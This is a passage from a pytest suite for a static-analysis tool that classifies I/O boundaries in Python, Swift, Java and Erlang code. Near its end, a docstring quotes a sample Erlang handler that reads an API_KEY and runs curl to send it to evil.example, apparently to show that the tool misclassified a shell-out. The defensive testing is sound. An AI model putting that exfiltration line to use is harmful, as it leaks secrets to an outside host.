    ) -> None:
        # The real shipped catalog, exercising the WI-bifih mis-stamp
        # population (unittest.mock x251, importlib.util/machinery, urllib.*,
        # concurrent.futures, ...).
        cat = load_catalog("python")
        assert cat.is_stdlib_module("unittest.mock")
        assert cat.is_stdlib_module("importlib.util")
        assert cat.is_stdlib_module("urllib.request")
        assert cat.is_stdlib_module("concurrent.futures")
        assert not cat.is_stdlib_module("requests.sessions")

    def test_module_io_is_enumerated_flag(self) -> None:
        cat = IoBoundaryCatalog(
            language="python",
            stdlib_modules=frozenset({"math", "os"}),
            stdlib_module_completeness={"math": "2026-05-13"},
        )
        assert cat.module_io_is_enumerated("math")
        # Listed in stdlib_modules but not flagged complete.
        assert not cat.module_io_is_enumerated("os")
        # Not listed at all.
        assert not cat.module_io_is_enumerated("unknown")

    def test_from_yaml_parses_flat_list_of_strings(
        self, tmp_path: Path,
    ) -> None:
        yaml_path = tmp_path / "lang.yaml"
        yaml_path.write_text(
            "language: python\n"
            "status: in_progress\n"
            "stdlib_modules:\n"
            "  - os\n"
            "  - sys\n"
            "  - re\n",
        )
        cat = IoBoundaryCatalog.from_yaml(yaml_path)
        assert cat.stdlib_modules == frozenset({"os", "sys", "re"})
        assert cat.stdlib_module_completeness == {}

    def test_from_yaml_parses_list_of_dicts_with_completeness(
        self, tmp_path: Path,
    ) -> None:
        yaml_path = tmp_path / "lang.yaml"
        yaml_path.write_text(
            "language: python\n"
            "status: in_progress\n"
            "stdlib_modules:\n"
            "  - module: math\n"
            "    completeness: complete\n"
            '    retrieved: "2026-05-13"\n'
            "  - module: os\n"
            "  - foo_should_be_ignored\n",  # mixed-shape entry
        )
        cat = IoBoundaryCatalog.from_yaml(yaml_path)
        assert cat.stdlib_modules == frozenset(
            {"math", "os", "foo_should_be_ignored"},
        )
        assert cat.stdlib_module_completeness == {"math": "2026-05-13"}

    def test_from_yaml_rejects_completeness_without_retrieved(
        self, tmp_path: Path,
    ) -> None:
        yaml_path = tmp_path / "lang.yaml"
        yaml_path.write_text(
            "language: python\n"
            "status: in_progress\n"
            "stdlib_modules:\n"
            "  - module: math\n"
            "    completeness: complete\n",
        )
        with pytest.raises(ValueError, match="retrieved"):
            IoBoundaryCatalog.from_yaml(yaml_path)

    def test_from_yaml_skips_dict_without_module_name(
        self, tmp_path: Path,
    ) -> None:
        yaml_path = tmp_path / "lang.yaml"
        yaml_path.write_text(
            "language: python\n"
            "status: in_progress\n"
            "stdlib_modules:\n"
            "  - completeness: complete\n"   # missing ``module:`` key
            '    retrieved: "2026-05-13"\n'
            "  - module: \"\"\n",            # empty module name
        )
        cat = IoBoundaryCatalog.from_yaml(yaml_path)
        # Neither malformed entry contributes.
        assert cat.stdlib_modules == frozenset()
        assert cat.stdlib_module_completeness == {}

    def test_from_yaml_parses_stdlib_prefixes(
        self, tmp_path: Path,
    ) -> None:
        yaml_path = tmp_path / "lang.yaml"
        yaml_path.write_text(
            "language: java\n"
            "status: in_progress\n"
            "stdlib_prefixes:\n"
            "  - java.util\n"
            "  - java.io\n"
            "  - \"\"\n"               # empty prefix is dropped
            "  - 42\n",                # non-string is dropped
        )
        cat = IoBoundaryCatalog.from_yaml(yaml_path)
        assert cat.stdlib_prefixes == ("java.util", "java.io")

    def test_from_yaml_ignores_non_list_stdlib_modules(
        self, tmp_path: Path,
    ) -> None:
        yaml_path = tmp_path / "lang.yaml"
        yaml_path.write_text(
            "language: python\n"
            "status: in_progress\n"
            "stdlib_modules: not a list\n"
            "stdlib_prefixes: also not a list\n",
        )
        cat = IoBoundaryCatalog.from_yaml(yaml_path)
        assert cat.stdlib_modules == frozenset()
        assert cat.stdlib_prefixes == ()

    def test_merge_unions_stdlib_modules_and_prefixes(self) -> None:
        child = IoBoundaryCatalog(
            language="kotlin",
            stdlib_modules=frozenset({"kotlin.collections"}),
            stdlib_prefixes=("kotlin",),
            stdlib_module_completeness={"kotlin.collections": "2026-05-13"},
        )
        parent = IoBoundaryCatalog(
            language="java",
            stdlib_modules=frozenset({"java.util"}),
            stdlib_prefixes=("java.io",),
            stdlib_module_completeness={
                "kotlin.collections": "2024-01-01",  # parent loses on collision
                "java.util": "2026-05-13",
            },
        )
        merged = child.merge(parent)
        assert merged.stdlib_modules == frozenset(
            {"kotlin.collections", "java.util"},
        )
        # Child-first dedup preserved.
        assert merged.stdlib_prefixes == ("kotlin", "java.io")
        # Child wins on completeness-map collision.
        assert merged.stdlib_module_completeness == {
            "kotlin.collections": "2026-05-13",
            "java.util": "2026-05-13",
        }

    def test_merge_dedupes_prefixes_in_child(self) -> None:
        # When child and parent share a prefix, the merged tuple has it
        # exactly once.
        child = IoBoundaryCatalog(
            language="scala",
            stdlib_prefixes=("scala.collection", "java.util"),
        )
        parent = IoBoundaryCatalog(
            language="java",
            stdlib_prefixes=("java.util", "java.io"),
        )
        merged = child.merge(parent)
        assert merged.stdlib_prefixes == (
            "scala.collection", "java.util", "java.io",
        )

    # ---- Filter 2 wired into _compute_external_potential ----

    def _make_edge_with_dst_ref(
        self,
        src: str,
        dst: str,
        module_path: str,
        name: str,
        is_resolved: bool = True,
    ):
        from hypergumbo_core.ir import Edge, ExternalRef
        return Edge.create(
            src=src,
            dst=dst,
            edge_type="calls",
            line=1,
            is_resolved=is_resolved,
            dst_ref=ExternalRef(
                lang="python",
                module_path=module_path,
                name=name,
            ),

            origin="test", origin_run_id="test",
        )

    def _boundary_node(self, dst_id: str, name: str) -> dict:
        return {
            "id": dst_id,
            "name": name,
            "kind": "external_symbol",
            "language": "python",
            "path": "<external>",
            "meta": {"external_boundary": True},
            "supply_chain": {"tier": 3, "tier_name": "external_dep"},
        }

    def test_filter_2_skips_when_module_is_completeness_complete(self) -> None:
        catalog = load_catalog("python")
        # Inject completeness for ``math`` for the duration of this test.
        # ``math.sqrt`` is provably not I/O — Filter 2 must skip it.
        catalog = IoBoundaryCatalog(
            language=catalog.language,
            primitives=catalog.primitives,
            ambiguous_names=catalog.ambiguous_names,
            status=catalog.status,
            stdlib_provenance=catalog.stdlib_provenance,
            stdlib_other=catalog.stdlib_other,
            stdlib_modules=frozenset({"math"}),
            stdlib_prefixes=catalog.stdlib_prefixes,
            stdlib_module_completeness={"math": "2026-05-13"},
        )
        dst = "python:math:0-0:sqrt:unresolved"
        edge = self._make_edge_with_dst_ref(
            src="python:/app/calc.py:5-10:calc:function",
            dst=dst,
            module_path="math",
            name="sqrt",
        )
        nodes_by_id = {dst: self._boundary_node(dst, "sqrt")}
        bmap = compute_boundary_map(
            [edge],
            {"python": catalog},
            nodes_by_id=nodes_by_id,
        )
        # Filter 2 short-circuits before chain emission.
        assert "external_potential" not in bmap.entries

    def test_filter_2_does_not_fire_for_unflagged_module(self) -> None:
        catalog = load_catalog("python")
        # ``some_random_lib`` is not flagged complete. Filter 2 must NOT
        # fire; the chain still appears in external_potential.
        dst = "python:some_random_lib:0-0:do_thing:unresolved"
        edge = self._make_edge_with_dst_ref(
            src="python:/app/main.py:5-10:run:function",
            dst=dst,
            module_path="some_random_lib",
            name="do_thing",
        )
        nodes_by_id = {dst: self._boundary_node(dst, "do_thing")}
        bmap = compute_boundary_map(
            [edge],
            {"python": catalog},
            nodes_by_id=nodes_by_id,
        )
        ext = bmap.entries.get("external_potential")
        assert ext is not None and len(ext.chains) == 1

    def test_from_yaml_parses_top_level_completeness_section(
        self, tmp_path: Path,
    ) -> None:
        """The separate ``stdlib_module_completeness:`` section is parsed.

        The refresh script regenerates ``stdlib_modules`` from the live
        interpreter; the closed-world flags live in their own section so
        the script doesn't have to merge dict-form entries it didn't
        author.
        """
        yaml_path = tmp_path / "lang.yaml"
        yaml_path.write_text(
            "language: python\n"
            "status: in_progress\n"
            "stdlib_modules:\n"
            "  - os\n"
            "  - math\n"
            "stdlib_module_completeness:\n"
            "  - module: math\n"
            "    completeness: complete\n"
            '    retrieved: "2026-05-13"\n'
            "  - module: os\n"   # listed without completeness flag
            "  - module: derived_auto_promoted\n"
            "    completeness: complete\n"
            '    retrieved: "2026-05-13"\n',
        )
        cat = IoBoundaryCatalog.from_yaml(yaml_path)
        # math is flagged complete.
        assert cat.module_io_is_enumerated("math")
        # os listed but unflagged.
        assert not cat.module_io_is_enumerated("os")
        # NO AUTO-PROMOTION. ``derived_auto_promoted`` appears only in the
        # completeness section, and that section says "I enumerated this
        # module's I/O" — not "this name ships with the interpreter". This
        # assertion used to run the other way, and the promotion it pinned was
        # a live route around the overlay guard: ADR-0016 forbids an overlay
        # relabelling a PyPI package as stdlib ("would be a supply-chain
        # misread rather than an I/O one") and ``load_overlay_catalog`` pops
        # ``stdlib_modules`` to enforce it, but an overlay carrying only a
        # ``stdlib_module_completeness`` entry for ``requests`` still made
        # ``is_stdlib_module("requests")`` answer True on the merged catalogue.
        # Measured, with the ``stdlib_modules:`` spelling as the control —
        # that one was correctly stripped.
        assert not cat.is_stdlib_module("derived_auto_promoted")
        assert cat.module_io_is_enumerated("derived_auto_promoted")
        # The two facts stay independent in both directions: ``os`` ships with
        # the interpreter and is not enumerated.
        assert cat.is_stdlib_module("os")

    def test_from_yaml_top_level_completeness_rejects_missing_retrieved(
        self, tmp_path: Path,
    ) -> None:
        yaml_path = tmp_path / "lang.yaml"
        yaml_path.write_text(
            "language: python\n"
            "status: in_progress\n"
            "stdlib_module_completeness:\n"
            "  - module: math\n"
            "    completeness: complete\n",
        )
        with pytest.raises(ValueError, match="retrieved"):
            IoBoundaryCatalog.from_yaml(yaml_path)

    def test_from_yaml_top_level_completeness_skips_bad_entries(
        self, tmp_path: Path,
    ) -> None:
        yaml_path = tmp_path / "lang.yaml"
        yaml_path.write_text(
            "language: python\n"
            "status: in_progress\n"
            "stdlib_module_completeness:\n"
            "  - not_a_dict\n"
            "  - module: \"\"\n"
            '    retrieved: "2026-05-13"\n',
        )
        cat = IoBoundaryCatalog.from_yaml(yaml_path)
        assert cat.stdlib_module_completeness == {}

    def test_python_catalog_lists_stdlib_modules_and_math_complete(
        self,
    ) -> None:
        """The shipped python.yaml has the 3.12 stdlib list + math flagged.

        Smoke test against the actually-shipped catalog. The exact count
        depends on the interpreter the refresh script was last run
        against; assert non-trivial size and presence of canonical
        members rather than a magic number.
        """
        cat = load_catalog("python")
        # Spot-check well-known modules.
        for mod in ("os", "sys", "re", "math", "json", "collections"):
            assert cat.is_stdlib_module(mod), (
                f"{mod!r} should be in python stdlib_modules"
            )
        # Long-tail non-stdlib should be absent.
        assert not cat.is_stdlib_module("requests")
        # Worked-example closed-world flag is on math, NOT on os.
        assert cat.module_io_is_enumerated("math")
        assert not cat.module_io_is_enumerated("os")

    def test_filter_2_skips_only_when_module_hint_is_present(self) -> None:
        """No module_hint (``module_hint == "external"``) → Filter 2 cannot fire.

        This is the safety property: Filter 2 only acts when it has a
        confident module identification. The dst_ref branch supplies
        ``module_path``, which we set to ``"external"`` here; the rest
        of the function then treats ``module_hint == "external"`` as
        no-info (see the composition guard). Filter 2 must not skip
        the chain when we have no module to check.
        """
        catalog = load_catalog("python")
        catalog = IoBoundaryCatalog(
            language=catalog.language,
            primitives=catalog.primitives,
            ambiguous_names=catalog.ambiguous_names,
            status=catalog.status,
            stdlib_provenance=catalog.stdlib_provenance,
            stdlib_other=catalog.stdlib_other,
            stdlib_modules=frozenset({"math"}),
            stdlib_prefixes=catalog.stdlib_prefixes,
            stdlib_module_completeness={"math": "2026-05-13"},
        )
        dst = "python:external:0-0:Mystery:unresolved"
        edge = self._make_edge_with_dst_ref(
            src="python:/app/x.py:5-10:f:function",
            dst=dst,
            module_path="external",  # no real module info
            name="Mystery",
        )
        nodes_by_id = {dst: self._boundary_node(dst, "Mystery")}
        bmap = compute_boundary_map(
            [edge],
            {"python": catalog},
            nodes_by_id=nodes_by_id,
        )
        # Chain still emitted — we lacked the module to apply Filter 2.
        ext = bmap.entries.get("external_potential")
        assert ext is not None and len(ext.chains) == 1


class TestSwiftCatalog:
    """Tests for the Swift I/O primitive catalog."""

    def test_swift_catalog_loads(self) -> None:
        """Swift catalog should load without errors."""
        catalog = load_catalog("swift")
        assert catalog.language == "swift"
        assert len(catalog.primitives) > 0

    def test_swift_has_fs_read(self) -> None:
        """Swift catalog covers FileManager read operations."""
        catalog = load_catalog("swift")
        fs_reads = [p for p in catalog.primitives if p.boundary == "fs_read"]
        names = {p.name for p in fs_reads}
        assert "fileExists" in names
        assert "contentsOfDirectory" in names

    def test_swift_has_fs_write(self) -> None:
        """Swift catalog covers FileManager write operations."""
        catalog = load_catalog("swift")
        fs_writes = [p for p in catalog.primitives if p.boundary == "fs_write"]
        names = {p.name for p in fs_writes}
        assert "createFile" in names
        assert "removeItem" in names
        assert "moveItem" in names

    def test_swift_has_net_send(self) -> None:
        """Swift catalog covers URLSession network send."""
        catalog = load_catalog("swift")
        net_sends = [p for p in catalog.primitives if p.boundary == "net_send"]
        names = {p.name for p in net_sends}
        assert "dataTask" in names
        assert "uploadTask" in names

    def test_swift_has_net_recv(self) -> None:
        """Swift catalog covers network receive operations."""
        catalog = load_catalog("swift")
        net_recvs = [p for p in catalog.primitives if p.boundary == "net_recv"]
        names = {p.name for p in net_recvs}
        assert "downloadTask" in names

    def test_swift_has_subprocess(self) -> None:
        """Swift catalog covers Process operations."""
        catalog = load_catalog("swift")
        subprocs = [p for p in catalog.primitives if p.boundary == "subprocess"]
        names = {p.name for p in subprocs}
        assert "waitUntilExit" in names

    def test_swift_has_logging(self) -> None:
        """Swift catalog covers print and NSLog."""
        catalog = load_catalog("swift")
        logs = [p for p in catalog.primitives if p.boundary == "logging"]
        names = {p.name for p in logs}
        assert "print" in names
        assert "NSLog" in names

    def test_swift_has_env_read(self) -> None:
        """Swift catalog covers ProcessInfo."""
        catalog = load_catalog("swift")
        env_reads = [p for p in catalog.primitives if p.boundary == "env_read"]
        names = {p.name for p in env_reads}
        assert "processInfo" in names

    def test_swift_all_boundary_types(self) -> None:
        """Swift catalog covers the major boundary types."""
        catalog = load_catalog("swift")
        boundaries = {p.boundary for p in catalog.primitives}
        expected = {"fs_read", "fs_write", "net_send", "net_recv",
                    "subprocess", "env_read", "logging"}
        assert expected.issubset(boundaries), (
            f"Missing boundaries: {expected - boundaries}"
        )

    def test_swift_ambiguous_names_block_unqualified_match(self) -> None:
        """Generic names like 'write' should not match without module context."""
        catalog = load_catalog("swift")
        # 'write' is in ambiguous_names — should not match for unresolved externals
        hit = catalog.lookup_with_module("write", module_hint="external")
        assert hit is None, "Generic 'write' should not match for external module hint"

    def test_swift_ambiguous_names_include_common_generics(self) -> None:
        """Verify that very common generic names are marked as ambiguous."""
        catalog = load_catalog("swift")
        for name in ["write", "read", "run", "Data", "String", "URL", "send"]:
            assert name in catalog.ambiguous_names, (
                f"'{name}' should be in ambiguous_names to prevent false positives"
            )

    def test_java_in_out_err_are_ambiguous(self) -> None:
        """System.in/out/err are ambiguous — must not match without module context.

        JPA CriteriaBuilder.in(), PrintWriter.out(), etc. produce edges like
        java:external:0-0:in:unresolved. Without ambiguous_names, 'in' matches
        System.in (ipc_recv), causing 20 false positives in keycloak.
        """
        catalog = load_catalog("java")
        for name in ["in", "out", "err"]:
            assert name in catalog.ambiguous_names, (
                f"'{name}' should be in ambiguous_names to prevent false positives "
                f"(e.g., JPA .in() matching System.in)"
            )

    def test_java_in_blocked_for_external(self) -> None:
        """'in' should NOT match for unresolved external calls."""
        catalog = load_catalog("java")
        hit = catalog.lookup_with_module("in", module_hint="external")
        assert hit is None, (
            "'in' matched as System.in for external module hint — "
            "this causes false ipc_recv on JPA .in() calls"
        )

    def test_java_in_matches_with_system_module(self) -> None:
        """'in' SHOULD match when module context is System."""
        catalog = load_catalog("java")
        hit = catalog.lookup_with_module("in", module_hint="System")
        assert hit is not None
        assert hit.boundary == "ipc_recv"

    def test_swift_distinctive_names_match_unresolved(self) -> None:
        """io-boundary:F3 — a bare method-kind name with no module context is
        no longer matched (INV-tapat: no receiver verification). ``fileExists``
        is a ``FileManager`` instance method (method-kind); without a receiver
        module it is suppressed, but with the module hint it still matches."""
        catalog = load_catalog("swift")
        # No module context — method-kind fileExists is suppressed under F3.
        assert catalog.lookup_with_module(
            "fileExists", module_hint="external") is None
        # With the receiver module it still matches.
        hit = catalog.lookup_with_module("fileExists", module_hint="FileManager")
        assert hit is not None
        assert hit.boundary == "fs_read"

    def test_swift_print_matches_as_logging(self) -> None:
        """Swift print() should be tagged as logging."""
        catalog = load_catalog("swift")
        hit = catalog.lookup_with_module("print", module_hint="external")
        assert hit is not None
        assert hit.boundary == "logging"

    def test_swift_io_tagging_on_edges(self) -> None:
        """End-to-end: tag_io_boundaries tags Swift unresolved call edges."""
        from dataclasses import dataclass
        from typing import Any, Dict, Optional

        @dataclass
        class MockEdge:
            src: str
            dst: str
            edge_type: str = "calls"
            meta: Optional[Dict[str, Any]] = None

        catalog = load_catalog("swift")
        # io-boundary:F3 — a bare method-kind call with no module context has no
        # receiver evidence, so it is no longer tagged (INV-tapat). The method-
        # kind URLSession.dataTask / FileManager.fileExists primitives must
        # carry their receiver module to be tagged; Swift.print is a top-level
        # function (function-kind) and still tags bare.
        edges = [
            MockEdge(
                src="swift:Sources/App/Network.swift:10:fetch:method",
                dst="swift:URLSession:0-0:dataTask:unresolved",
            ),
            MockEdge(
                src="swift:Sources/App/Util.swift:5:log:method",
                dst="swift:external:0-0:print:unresolved",
            ),
            MockEdge(
                src="swift:Sources/App/IO.swift:20:check:method",
                dst="swift:FileManager:0-0:fileExists:unresolved",
            ),
            # Generic 'write' should NOT be tagged (ambiguous)
            MockEdge(
                src="swift:Sources/App/Writer.swift:15:save:method",
                dst="swift:external:0-0:write:unresolved",
            ),
            # F3: a bare method-kind call with no module context is suppressed.
            MockEdge(
                src="swift:Sources/App/IO.swift:30:peek:method",
                dst="swift:external:0-0:fileExists:unresolved",
            ),
        ]
        count = tag_io_boundaries(edges, {"swift": catalog})
        assert count == 3, f"Expected 3 tagged edges, got {count}"
        assert edges[0].meta["io_boundary"] == "net_send"
        assert edges[1].meta["io_boundary"] == "logging"
        assert edges[2].meta["io_boundary"] == "fs_read"
        assert edges[3].meta is None  # 'write' should not be tagged
        # F3: bare method-kind fileExists with no receiver module is suppressed.
        assert edges[4].meta is None

    def test_swift_has_swiftnio_server_primitives(self) -> None:
        """Swift catalog covers SwiftNIO server infrastructure."""
        catalog = load_catalog("swift")
        net_recvs = {p.name for p in catalog.primitives if p.boundary == "net_recv"}
        net_sends = {p.name for p in catalog.primitives if p.boundary == "net_send"}
        process = {p.name for p in catalog.primitives if p.boundary == "process_send"}
        # Event loop group creation is server infrastructure
        assert "MultiThreadedEventLoopGroup" in net_recvs
        # Graceful shutdown is process lifecycle
        assert "syncShutdownGracefully" in process
        # HTTP client request construction
        assert "HTTPClientRequest" in net_sends

    def test_swift_has_websocket_handlers(self) -> None:
        """Swift catalog covers WebSocket event handlers."""
        catalog = load_catalog("swift")
        net_recvs = {p.name for p in catalog.primitives if p.boundary == "net_recv"}
        assert "onText" in net_recvs
        assert "onBinary" in net_recvs

    def test_swift_has_tls_primitives(self) -> None:
        """Swift catalog covers NIO TLS/SSL primitives."""
        catalog = load_catalog("swift")
        net_sends = {p.name for p in catalog.primitives if p.boundary == "net_send"}
        assert "NIOSSLContext" in net_sends
        assert "NIOSSLCertificate" in net_sends

    def test_swift_has_nio_channel_operations(self) -> None:
        """Swift catalog covers NIO async channel and pipeline operations."""
        catalog = load_catalog("swift")
        net_sends = {p.name for p in catalog.primitives if p.boundary == "net_send"}
        net_recvs = {p.name for p in catalog.primitives if p.boundary == "net_recv"}
        # NIOAsyncChannel is a bidirectional IO channel
        assert "NIOAsyncChannel" in net_recvs
        # Pipeline handler addition
        assert "addHandler" in net_sends

    def test_swift_has_tracing_primitives(self) -> None:
        """Swift catalog covers distributed tracing span operations."""
        catalog = load_catalog("swift")
        logging = {p.name for p in catalog.primitives if p.boundary == "logging"}
        assert "startSpan" in logging
        assert "endSpan" in logging

    def test_swift_server_io_tagging_on_edges(self) -> None:
        """End-to-end: tag_io_boundaries tags server-side Swift IO edges."""
        from dataclasses import dataclass
        from typing import Any, Dict, Optional

        @dataclass
        class MockEdge:
            src: str
            dst: str
            edge_type: str = "calls"
            meta: Optional[Dict[str, Any]] = None

        catalog = load_catalog("swift")
        # io-boundary:F3 — these are method-kind catalog entries, so the edge
        # must carry the receiver module (no-receiver-evidence bare calls are
        # now suppressed under INV-tapat). The module hints below are the
        # PascalCase type names the receiver-type inference would supply.
        edges = [
            MockEdge(
                src="swift:Sources/App/Server.swift:10:setup:method",
                dst="swift:EventLoopGroup:0-0:MultiThreadedEventLoopGroup:unresolved",
            ),
            MockEdge(
                src="swift:Sources/App/Server.swift:15:teardown:method",
                dst="swift:EventLoopGroup:0-0:syncShutdownGracefully:unresolved",
            ),
            MockEdge(
                src="swift:Sources/App/WS.swift:20:handle:method",
                dst="swift:WebSocket:0-0:onText:unresolved",
            ),
            MockEdge(
                src="swift:Sources/App/TLS.swift:5:configure:method",
                dst="swift:NIOSSL:0-0:NIOSSLContext:unresolved",
            ),
            MockEdge(
                src="swift:Sources/App/Client.swift:8:fetch:method",
                dst="swift:AsyncHTTPClient:0-0:HTTPClientRequest:unresolved",
            ),
        ]
        count = tag_io_boundaries(edges, {"swift": catalog})
        assert count == 5, f"Expected 5 tagged edges, got {count}"
        assert edges[0].meta["io_boundary"] == "net_recv"
        assert edges[1].meta["io_boundary"] == "process_send"
        assert edges[2].meta["io_boundary"] == "net_recv"
        assert edges[3].meta["io_boundary"] == "net_send"
        assert edges[4].meta["io_boundary"] == "net_send"

    def test_swift_has_logger_methods(self) -> None:
        """Swift catalog covers swift-log Logger level methods."""
        catalog = load_catalog("swift")
        logs = {p.name for p in catalog.primitives if p.boundary == "logging"}
        for method in ["debug", "info", "warning", "error", "critical", "notice", "trace"]:
            assert method in logs, f"Logger.{method} missing from Swift logging catalog"

    def test_swift_variable_name_module_hint_matches(self) -> None:
        """Variable-name module hints (camelCase) should match PascalCase catalog modules.

        In Swift, the analyzer extracts the receiver variable name as the module
        hint (e.g., 'context' from 'context.writeAndFlush()'). The catalog uses
        PascalCase type names (e.g., 'ChannelHandlerContext'). Case-insensitive
        substring matching must bridge this gap.
        """
        from dataclasses import dataclass
        from typing import Any, Dict, Optional

        @dataclass
        class MockEdge:
            src: str
            dst: str
            edge_type: str = "calls"
            meta: Optional[Dict[str, Any]] = None

        catalog = load_catalog("swift")
        edges = [
            # context.writeAndFlush() → ChannelHandlerContext.writeAndFlush
            MockEdge(
                src="swift:Sources/App/Handler.swift:10:handle:method",
                dst="swift:context:0-0:writeAndFlush:unresolved",
            ),
            # channel.addHandler() → Channel.addHandler
            MockEdge(
                src="swift:Sources/App/Pipeline.swift:20:setup:method",
                dst="swift:channel:0-0:addHandler:unresolved",
            ),
            # fileIO.openFile() → NonBlockingFileIO.openFile
            MockEdge(
                src="swift:Sources/App/IO.swift:30:readFile:method",
                dst="swift:fileIO:0-0:openFile:unresolved",
            ),
            # logger.debug() → Logger.debug (logging)
            MockEdge(
                src="swift:Sources/App/Service.swift:40:process:method",
                dst="swift:logger:0-0:debug:unresolved",
            ),
        ]
        count = tag_io_boundaries(edges, {"swift": catalog})
        assert count == 4, f"Expected 4 tagged edges, got {count}"
        assert edges[0].meta["io_boundary"] == "net_send"
        assert edges[1].meta["io_boundary"] == "net_send"
        assert edges[2].meta["io_boundary"] == "fs_read"
        assert edges[3].meta["io_boundary"] == "logging"


class TestDstRefPreferredOverDstString:
    """WI-tihup PR2: io_boundary prefers ``Edge.dst_ref`` over the
    legacy colon-split heuristic when present.

    Exercises the dst_ref-prefer branches at io_boundary.py:828-830
    (compute_boundary_map / _compose_primitive_chains) and 1199-1201
    (_classify_call_edges via tag_io_boundaries).
    """

    def test_tag_io_boundaries_uses_dst_ref_module_and_name(self) -> None:
        """Real Edge with dst_ref populated: tag_io_boundaries reads
        module_hint and callee from the ref, not from the legacy dst
        string."""
        from hypergumbo_core.ir import Edge, ExternalRef

        catalog = load_catalog("python")
        # Build a legacy dst string with a deliberately misleading
        # module_hint and name — if the implementation parses the
        # string, primitive lookup would miss. The dst_ref carries the
        # correct (urllib.request, urlopen) pair.
        edge = Edge.create(
            src="python:/app/main.py:1-1:fetch:function",
            dst="python:WRONG_MODULE:0-0:wrong_name:unresolved",
            edge_type="calls",
            line=1,
            is_resolved=False,
            dst_ref=ExternalRef(
                lang="python",
                module_path="urllib.request",
                name="urlopen",
            ),

            origin="test", origin_run_id="test",
        )
        count = tag_io_boundaries([edge], {"python": catalog})
        assert count == 1
        assert edge.meta["io_primitive"] == "urllib.request.urlopen"

    def test_compute_external_potential_uses_dst_ref(self) -> None:
        """``_compute_external_potential`` (reached via
        ``compute_boundary_map`` when ``nodes_by_id`` is supplied) prefers
        ``Edge.dst_ref`` over the colon-split heuristic for the
        external-potential composition path."""
        from hypergumbo_core.ir import Edge, ExternalRef

        catalog = load_catalog("python")
        # Use a callable name that is NOT in the python catalog so
        # tag_io_boundaries leaves meta.io_boundary unset, falling
        # through to the _compute_external_potential branch.
        # is_resolved=True so the F3 Filter 1 (skip unresolved) doesn't
        # short-circuit the dst_ref branch we want to exercise. This
        # test is about composition source-of-truth, not resolvability.
        edge = Edge.create(
            src="python:/app/main.py:1-1:caller:function",
            dst="python:WRONG_MODULE:0-0:wrong_name:unresolved",
            edge_type="calls",
            line=1,
            is_resolved=True,
            dst_ref=ExternalRef(
                lang="python",
                module_path="custom_pkg.subpkg",
                name="custom_func",
            ),

            origin="test", origin_run_id="test",
        )
        # nodes_by_id must mark the dst as an external boundary node
        # for _compute_external_potential to consider the edge. The
        # name slot is what the dst_ref-prefer branch returns when the
        # dst_node has no ``name`` field.
        nodes_by_id = {
            edge.dst: {
                "id": edge.dst,
                "name": None,
                "meta": {"external_boundary": True},
            }
        }
        bmap = compute_boundary_map(
            [edge], {"python": catalog}, nodes_by_id=nodes_by_id,
        )
        # The external_potential entry surfaces the dst_ref-derived
        # primitive (custom_pkg.subpkg.custom_func), not the legacy
        # WRONG_MODULE.wrong_name from the colon-split.
        assert "external_potential" in bmap.entries
        primitives = bmap.entries["external_potential"].primitives_used
        assert any(
            "custom_pkg.subpkg" in p and "custom_func" in p
            for p in primitives
        )


class TestInProgressLanguages:
    """WI-najil: consumers must be able to identify which of a query's
    languages ship an ``status: in_progress`` io_primitives catalog, so a
    zero-match result can be disclosed as possibly-incomplete rather than
    read as a genuine 'no I/O here'.
    """

    def test_selects_only_in_progress_catalogs(self) -> None:
        from hypergumbo_core.io_boundary import in_progress_languages
        # python / rust / erlang ship status: complete; go / java ship in_progress.
        result = in_progress_languages(
            ["python", "go", "rust", "java", "erlang"]
        )
        assert result == ["go", "java"]

    def test_excludes_unsupported_language(self) -> None:
        """A language with no catalog (is_supported=False, status defaults to
        'complete') is NOT flagged in_progress — it carries the separate
        unsupported signal (INV-javam)."""
        from hypergumbo_core.io_boundary import in_progress_languages
        assert in_progress_languages(["klingon"]) == []

    def test_complete_only_returns_empty(self) -> None:
        from hypergumbo_core.io_boundary import in_progress_languages
        assert in_progress_languages(["python", "rust", "erlang"]) == []

    def test_sorted_and_deduped(self) -> None:
        from hypergumbo_core.io_boundary import in_progress_languages
        assert in_progress_languages(["java", "go", "java", "go"]) == ["go", "java"]

    def test_empty_input(self) -> None:
        from hypergumbo_core.io_boundary import in_progress_languages
        assert in_progress_languages([]) == []


def _grpc_impl_edge(src: str, dst: str, protocol: str | None = "grpc") -> Edge:
    """A folded gRPC RPC-implementation edge (implements + meta protocol)."""
    edge = Edge.create(
        src=src, dst=dst, edge_type="implements", line=1,
        origin="test", origin_run_id="test", confidence=0.9,
    )
    if protocol is not None:
        edge.meta = {"protocol": protocol}
    return edge


class TestGrpcRpcImplementationTraceability:
    """The folded gRPC RPC-implementation edge (implements + protocol=grpc,
    audit-findings 0016) stays traceable for I/O-boundary reachability — the
    coupling implements_rpc used to carry is preserved via the predicate, not
    demoted with the structural 'implements' rename (finding 3)."""

    def test_is_traceable_edge_matches_folded_grpc(self) -> None:
        assert _is_traceable_edge(_grpc_impl_edge("a", "b")) is True

    def test_is_traceable_edge_rejects_plain_implements(self) -> None:
        # A structural implements edge (no protocol) is NOT traceable — the
        # meta discriminator is load-bearing, not a wholesale inclusion.
        assert _is_traceable_edge(_grpc_impl_edge("a", "b", protocol=None)) is False

    def test_reverse_graph_crosses_folded_grpc_edge(self) -> None:
        grpc = _grpc_impl_edge(
            "py:client:1-1:call:function", "py:server:1-1:impl:function")
        plain = _grpc_impl_edge(
            "py:x:1-1:c:function", "py:y:1-1:i:function", protocol=None)
        rev = _build_reverse_graph([grpc, plain])
        # Folded gRPC edge crosses the reverse (callee → caller) graph;
        # the plain structural implements edge does not.
        assert rev.get("py:server:1-1:impl:function") == {
            "py:client:1-1:call:function"}
        assert "py:y:1-1:i:function" not in rev


class TestTheBeamShellOutIsASubprocessNotAnEnvRead:
    """WI-jupaf. ``os:cmd/1`` is Erlang's shell-out — it runs a command through
    the OS shell — and it was catalogued as an ENVIRONMENT READ and WRITE,
    sitting beside ``getenv`` and ``putenv``. It looks like ``cmd`` was swept
    along with the rest of the ``os`` module.

    MEASURED ON THE SHIPPED CLI BEFORE THE FIX, which is what turns this from a
    tidiness complaint into a false-confirm:

        -module(leak).
        handler() ->
            Secret = os:getenv("API_KEY"),
            os:cmd("curl -d " ++ Secret ++ " https://evil.example/p").

        claim {boundary: subprocess, must_not_exist: true}
          -> Verdict: CONFIRMED, rc 0, "No subprocess chains found."

    The call is not invisible — that would merely be a recall miss. It is
    CLASSIFIED, as ``env_read``, and since INV-buzab a classified call is what
    ``examined`` means. So the exfiltration is reported as an EXAMINED NEGATIVE
    for the boundary that is actually true, with ``high_risk: false``. That is
